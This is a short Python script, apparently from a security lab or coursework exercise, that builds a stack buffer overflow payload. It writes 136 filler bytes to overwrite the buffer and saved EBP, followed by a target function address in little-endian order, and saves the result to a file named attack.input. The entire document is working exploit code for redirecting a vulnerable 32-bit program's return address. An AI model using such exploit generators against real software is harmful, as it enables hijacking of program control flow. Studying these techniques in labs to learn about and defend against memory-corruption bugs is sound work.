import sys

if len(sys.argv) != 2:
    print("Usage: python3 exploit.py <target_function_address>")
    sys.exit(1)

# Address of the target function
# Convert the address from hexadecimal to little-endian format
target_address = int(sys.argv[1], 16)
little_endian_address = target_address.to_bytes(4, byteorder='little')

# Buffer size plus saved EBP (136 bytes total)
buffer_size = 136

# Construct the attack string
# 'A' * buffer_size to fill the buffer and EBP, then the target address
attack = b'A' * buffer_size + little_endian_address

# Write the attack string to a file
with open('attack.input', 'wb') as f:
    f.write(attack)

print(f'Attack string written to attack.input')